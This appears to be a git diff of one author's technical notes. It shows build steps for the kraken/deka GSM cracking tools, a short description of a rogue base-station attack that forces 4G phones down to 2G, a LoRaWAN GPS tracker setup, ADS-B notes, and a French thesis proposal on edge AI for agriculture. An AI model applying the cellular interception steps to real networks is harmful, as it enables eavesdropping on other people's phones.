+git clone https://github.com/0x7678/typhon-vx/tree/master/kraken
 sudo add-apt-repository ppa:deadsnakes/ppa
 sudo apt update
 sudo apt install python3.7 python3.7-dev nvidia-utils-515-server xserver-xorg-video-nvidia-515
@@ -2057,15 +1320,23 @@ cd deka
 ./genkernel64.sh > slice.c
 sed -i -e 's/3.5m/3.7m/g' Makefile
 make
-
 ```
-------------------------------------------------------------------------
 
-**Lora :**
-==========
+newpage
+[Redirection Attack](https://www.youtube.com/watch?v=gHKmmVZAaFo)
 
-**GPS tracker via LoraWAN**
-===========================
+And it does !
+
+Then what to do ?
+We know how to be a BTS in front of a MS and force the UE (User Equipement : 4G phone) to fallback into 2G.
+
+Hey ! We gonna pretend that we are the MS in front of the BTS !
+
+\newpage
+
+# LoRa
+
+## GPS tracker via LoraWAN
 
 [![UML](uml.png)](uml.png)
 
@@ -2177,7 +1448,7 @@ sudo apt update && sudo apt upgrade
 
 Now we install necessary packages
 
-``` {.sourceCode .bash}
+```bash
 sudo apt install git device-tree-compiler git python3-crypto python3-nmea2 python3-rpi.gpio python3-serial python3-spidev python3-configobj gpsd libgps-dev gpsd-clients python3-pip
 pip3 install simplecayennelpp
 git clone https://github.com/bbaranoff/libgps
@@ -2188,7 +1459,7 @@ sudo ldconfig
 nano /etc/default/gpsd
 ```
 
-``` {.sourceCode .}
+```
 # Default settings for the gpsd init script and the hotplug wrapper.
 
 # Start the gpsd daemon automatically at boot time
@@ -2400,8 +1671,7 @@ Live Data from GPS tracker !
 
 newpage
 
-**ADSB**
-========
+# ADSB
 
 Automatic Dependent Surveillance Broadcast (ADS-B)
 
@@ -2424,48 +1694,42 @@ traffic:
 
 newpage
 
-**Appendix**
-============
-
-Redirection Attack Code
-
-`` ` {r, eval=FALSE}  !/bin/bash ==========  git clone git://git.code.sf.net/p/openlte/code openlte-code cd openlte-code git checkout a5a66e  .. code-block:: ``\`
-{r, eval=FALSE, diff}
-
-newpage
 
 
-#APOGÉ - l'intelligence Artificielle en Périphérie pOur l'aGriculture de prÉcision
+\newpage
+
+
+# APOGÉ - l'intelligence Artificielle en Périphérie pOur l'aGriculture de prÉcision
 author: "Bastien Baranoff"
 
-# 1 - Introduction
+## 1 - Introduction
 
 De nos jours, l'agriculture nécessite une attention particulière pour éviter une mauvaise utilisation des pesticides et de l'eau, par exemple. Pour être en mesure de faire face à cela, l'agriculteur doit savoir ce qu'il peut et ne peut pas faire. Cette thèse a pour prétention de combler l'écart entre les connaissances des agriculteurs et des informaticiens. De cette manière, nous devons intégrer les connaissances des agriculteurs et proposer quelque chose de facile à utiliser pour l'aider à devenir un utilisateur final de thèmes tels que l'IA ou LoRa. Il est dommage qu'à partir de maintenant, il ne puisse pas utiliser ces technologies alors qu'elles seraient des outils vraiment utiles pour superviser et agir sur ses champs.
 
-# 2 - Contexte
+## 2 - Contexte
 
-## Les besoins de l'agriculture de précision
+### Les besoins de l'agriculture de précision
 
 L'agriculture de précision vise à maximiser la production tout en minimisant l'utilisation des ressources naturelles et en réduisant les impacts environnementaux. Cela nécessite une collecte précise de données sur les sols, les cultures et les conditions météorologiques, ainsi qu'une surveillance continue des conditions de croissance pour permettre des interventions en temps réel. L'agriculture de précision repose sur des technologies avancées telles que l'intelligence artificielle (IA), les capteurs, les drones et les systèmes de communication en réseau.
 
-## Les défis actuels de l'agriculture de précision
+### Les défis actuels de l'agriculture de précision
 
 L'un des principaux défis de l'agriculture de précision est de combiner efficacement les connaissances agronomiques avec les technologies avancées. Les agriculteurs ont souvent une connaissance pratique approfondie de leurs cultures et de leurs sols, mais ils peuvent manquer de compétences en informatique pour tirer le meilleur parti des technologies de précision. D'autre part, les ingénieurs et les informaticiens peuvent avoir une compréhension limitée des besoins et des contraintes du monde agricole, ce qui peut entraîner des solutions techniques qui ne sont pas adaptées à la réalité du terrain.
 
-# 3 - Solution proposée : APOGÉ
+## 3 - Solution proposée : APOGÉ
 
 Pour répondre à ces défis, nous avons développé APOGÉ - l'intelligence Artificielle en Périphérie pOur l'aGriculture de prÉcision. Il s'agit d'une solution de surveillance et de contrôle de l'agriculture de précision basée sur l'IA, qui utilise des capteurs décentralisés pour collecter des données en temps réel sur les conditions de croissance des cultures. Les données sont traitées localement, sans avoir besoin d'une connexion Internet constante, ce qui permet d'économiser de l'énergie et de réduire les coûts de communication.
 
 APOGÉ utilise des algorithmes d'apprentissage automatique pour analyser les données collectées et fournir des recommandations précises pour optimiser la production de cultures. Les recommandations sont présentées à l'agriculteur sous forme de
 
-# 4 - Processus :
+## 4 - Processus :
 
 Nous avons choisi d’utiliser un drone pour survoler les champs de l’agriculteur et vérifier ses plantations. Nous avons choisi le processeur NVIDIA Jetson pour le traitement des données avec l’IA utilisant Edge pour éviter autant que possible l’utilisation du cloud. En effet, Jetson devrait suffire pour une première vue de ce projet. Et aussi longtemps qu’il s’agit d’électronique embarquée, la dissipation de puissance devrait être inférieure à celle d’un ordinateur traditionnel et nous pouvons le placer sur le drone. Les moyens de communication se feront par Wi-Fi et LoRa :
 
 - Wi-Fi pour la collecte de données massive
 - LoRa pour traiter les requêtes précises et ciblées
 
-# 5 - Méthodologie 
+## 5 - Méthodologie 
 
 Pour commencer, nous devrons définir les exigences de notre système, qui seront basées sur les besoins exprimés dans la section précédente. Cela nous permettra de déterminer les composants matériels et logiciels nécessaires pour construire notre solution. Ensuite, nous concevrons l’architecture globale de notre système, en prenant en compte les différents composants matériels et logiciels nécessaires. Cette étape nous permettra d’identifier les éventuels points de blocage ou de dysfonctionnement de notre solution, ainsi que les solutions à apporter.
 
@@ -2475,17 +1739,16 @@ Une fois que tous les composants auront été installés et configurés, nous pr
 
 Enfin, nous livrerons le système au client, accompagné d’une documentation complète sur son fonctionnement, sa maintenance et sa gestion. Nous formerons également le personnel du client sur l’utilisation du système et fournirons un support technique pour répondre à toutes les questions ou problèmes éventuels. Nous allons utiliser le service cloud de WeeNat (https://weenat.com/) pour cette étude.
 
-# 6 - Enjeux et anticipations:
+## 6 - Enjeux et anticipations:
 - La surveillance et l’utilisation d’un champ agricole par EDGE-IA permettront de réduire les coûts pour l’utilisateur.
 - Préservation de l’écosystème (avec la détection des maladies, l’agriculteur peut éviter d’utiliser des pesticides et ne traiter que les maladies qui affectent ses parcelles).
 - Partager ses données en échange d’argent ou d’autres données.
 - Apposer une étiquette indiquant qu’il n’a pas utilisé de pesticides et que ses cultures sont saines.
 
-# 7 - Motivations
+## 7 - Motivations
 
 Passionné de radio-télécommunications depuis 10 ans, je suis ravi de partager mes connaissances avec ceux qui peuvent les comprendre. Avec des compétences en télécommunications mobiles (GSM -> 5G-SA) et en LoRa, je suis bien placé pour aborder le sujet proposé. Peu de personnes sont capables de comprendre ces protocoles, ce qui me donne une perspective unique sur le sujet.
 
-Mon handicap m'a obligé à travailler de manière non académique, mais j'ai appris à être autonome dans mes recherches depuis des années. J'ai également des compétences en électronique et en informatique qui peuvent être utiles pour ce projet. L'électronique embarquée est exactement le domaine de recherche de mes compétences, et j'aime être confronté à de nouveaux défis.
 
 J'ai l'habitude de travailler avec du matériel bon marché, comme les clones électroniques chinois, et de les faire fonctionner avec peu de documentation. J'ai également de l'expérience en rétro-ingénierie pour faire fonctionner d'anciens logiciels. La sécurité en radio-télécommunications est un sujet qui m'intéresse particulièrement. Je préfère cela plutôt que le domaine de la sécurité TCP/IP, qui est traité par des personnes plus compétentes que moi.
 
@@ -2499,41 +1762,65 @@ Cordialement,
 
 - Bastien Baranoff
 
-```
+```{r, echo=FALSE, warning=FALSE} 
+
 library(ggplot2)
-library(ggantt)
+library(DiagrammeR)
 
 # Création de la structure de données
-taches <- data.frame(
-  tache = c("Analyse bibliographique", "Conception du plan de recherche", "Collecte de données", 
-            "Analyse de données", "Rédaction du manuscrit", "Relecture et correction"),
-  debut = c(as.Date("2023-04-17"), as.Date("2023-07-01"), as.Date("2023-09-01"),
-            as.Date("2024-06-01"), as.Date("2025-01-01"), as.Date("2025-09-01")),
-  fin = c(as.Date("2023-06-30"), as.Date("2024-05-31"), as.Date("2024-12-31"),
-          as.Date("2025-08-31"), as.Date("2026-05-31"), as.Date("2026-09-30")),
-  duree = as.numeric(as.Date(c("2023-06-30", "2024-05-31", "2024-12-31", "2025-08-31", "2026-05-31", "2026-09-30"))) - 
-    as.numeric(as.Date(c("2023-04-17", "2023-07-01", "2023-09-01", "2024-06-01", "2025-01-01", "2025-09-01")))
-)
+mermaid("
 
-# Configuration du diagramme de Gantt
-g <- ggantt(taches, title="Gantt pour la réalisation du projet de thèse",
-            calendar="western-calendar",
-            date.breaks="1 month",
-            y.labels=taches$tache,
-            x.labels="",
-            show.grid="months")
+gantt
 
-# Affichage du diagramme
-g
+dateFormat  YYYY-MM-DD
+
+title Diagramme de GANTT d'un projet QSE
+
+
+section Prise en main
+
+Engagement de la direction           :crit,done,   p_en_main_1,    2018-09-01, 2018-09-08
+
+Description de la ferme              :done,        p_en_main_2,    2018-09-08, 3w
+
+Rédaction de la gestion documentaire :done,        gestion_doc,    2018-09-06, 10d
+
+Rédaction des procédures             :active,      p_en_main_4,    after gestion_doc, 30d
+
+
+section Analyses des problèmes et causes
+
+Lister les problème                 :active,      pb_1,   2018-10-06,     24h
+
+Identifier les causes               :active,      pb_2,   after pb_1,     1w
+
+Sélectionner les causes             :active,      pb_3,   after pb_2,     1w
+
+Construire les graphiques           :active,      pb_4,   after pb_3,     1w
+
+
+section Mise en place des Solutions
+
+Rédaction                           :active,      fin_1,     after pb_3,  3d
+
+Application                         :active,      fin_2,     after fin_1, 1w
+
+Rédaction du diaporama              :crit,        fin_3,     after fin_2, 48h
+
+")
+
 ```
 
+\newpage
 
+# Apendix
 
-**Bibliograpy**
-===============
+\newpage
 
-------------------------------------------------------------------------
+# Bibliography
 
-nocite: \'@\*\'
-===============
+---
+nocite: '@*'
+---
+
 
